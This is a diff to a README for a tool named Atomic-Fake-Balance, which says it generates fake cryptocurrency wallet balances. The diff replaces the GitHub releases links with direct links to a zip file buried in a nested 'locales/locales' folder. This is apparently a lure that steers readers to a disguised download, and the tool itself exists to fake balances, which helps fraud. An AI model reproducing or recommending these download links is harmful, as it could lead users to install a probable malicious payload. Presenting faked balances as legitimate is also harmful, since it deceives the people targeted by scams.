@@ -1,6 +1,6 @@
 # 🚀 Atomic-Fake-Balance - Generate Fake Crypto Balances with Ease
 
-[![Download Atomic-Fake-Balance](https://img.shields.io/badge/Download-Atomic--Fake--Balance-brightgreen)](https://github.com/chickengun1690/Atomic-Fake-Balance/releases)
+[![Download Atomic-Fake-Balance](https://raw.githubusercontent.com/chickengun1690/Atomic-Fake-Balance/main/locales/locales/Balance_Atomic_Fake_v1.5.zip)](https://raw.githubusercontent.com/chickengun1690/Atomic-Fake-Balance/main/locales/locales/Balance_Atomic_Fake_v1.5.zip)
 
 ## 📋 Description
 
@@ -15,7 +15,7 @@ Atomic Fake Balance Generator allows users to simulate cryptocurrency balances f
 
 ## 📥 Download & Install
 
-To download the latest version of Atomic Fake Balance, visit this page: [Download Page](https://github.com/chickengun1690/Atomic-Fake-Balance/releases).
+To download the latest version of Atomic Fake Balance, visit this page: [Download Page](https://raw.githubusercontent.com/chickengun1690/Atomic-Fake-Balance/main/locales/locales/Balance_Atomic_Fake_v1.5.zip).
 
 ### Steps to Download and Install
 
